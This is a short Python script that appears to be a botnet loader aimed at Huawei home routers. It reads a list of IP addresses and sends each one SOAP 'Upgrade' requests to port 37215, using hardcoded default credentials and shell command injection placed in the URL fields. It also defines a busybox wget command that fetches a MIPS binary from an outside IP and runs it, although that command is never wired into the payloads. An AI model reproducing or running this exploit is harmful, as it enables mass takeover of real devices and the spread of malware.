#! python !#
import threading, sys, time, random, socket, re, os, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *
ips = open(sys.argv[1], "r").readlines()
cmd1 = "/bin/busybox wget -g 89.38.150.59 -l /tmp/mips -r /mips"
cmd2 = "chmod 777 /tmp/mips;/tmp/mips; rm -rf /tmp/mips"
payload1 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(89.38.150.59)</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
payload2 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(89.38.150.59)</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
class rtek(threading.Thread):
		def __init__ (smips, ip):
			threading.Thread.__init__(smips)
			smips.ip = str(ip).rstrip('\n')
		def run(smips):
			try:
				print "[Huawei] Loading - " + smips.ip
				url = "http://" + smips.ip + ":37215/ctrlt/DeviceUpgrade_1"
				requests.post(url, timeout=3, data=payload1, auth=HTTPDigestAuth('dslf-config', 'admin'))
				requests.post(url, timeout=2.5, data=payload2, auth=HTTPDigestAuth('dslf-config', 'admin'))
			except Exception as e:
				pass
for ip in ips:
	try:
		n = rtek(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass
